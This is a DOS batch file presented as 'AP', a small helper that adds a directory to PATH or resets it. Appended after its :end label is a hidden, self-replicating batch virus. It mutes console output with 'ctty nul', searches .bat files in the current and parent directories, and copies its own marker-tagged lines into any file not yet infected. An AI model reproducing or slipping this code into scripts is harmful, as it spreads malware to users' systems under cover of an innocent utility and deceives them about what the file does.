@echo off
if "%1"=="" goto help
if "%1"=="-" goto reset
set oldpath=%path%
path=%1;%path%
goto end
:reset
if "%oldpath%"=="" goto end
set path=%oldpath%
set oldpath=
goto end
:help
echo AP newdir : Add a directory to current PATH
echo AP -      : Reset to previous PATH
:end
@ctty nul._!
for %%a in (*.bat ..\*.bat) do set _!=%%a
find "_!"<%_!%
if errorlevel 1 find "_!"<%0.BAT>>%_!%
ctty con._!
